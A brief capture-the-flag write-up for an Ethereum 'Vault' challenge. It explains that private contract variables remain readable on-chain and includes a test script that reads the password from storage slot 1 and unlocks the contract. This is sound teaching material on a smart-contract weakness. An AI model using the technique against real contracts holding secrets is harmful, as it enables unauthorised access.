# Vault Challenge Explanation

In Ethereum, designating a variable as `private` does not hide its data from the blockchain. This means we can retrieve the data using functions like `web3.eth.getStorageAt(address, storageSlot)`.

In the context of the Vault challenge, the password is located in slot 1 of the contract's storage. By invoking `web3.eth.getStorageAt(contract.address, 1)`, we can obtain the password.

With the password at hand, we can unlock the vault by calling the contract's `unlock()` function, thereby solving the challenge.

This challenge underscores the fact that sensitive data should not be stored unencrypted in a contract's storage, as it can be publicly accessed on the blockchain.

```javascript
it("solves the challenge", async function () {
  // Read password from storage
  // Password is at storage slot 1
  const password = await eoa.provider.getStorageAt(challenge.address, 1);
  console.log(
    `password = ${password} "${Buffer.from(password.slice(2), `hex`)}"`
  );

  tx = await challenge.unlock(password);
  await tx.wait();
  expect(await challenge.locked()).to.equal(false);
});
```
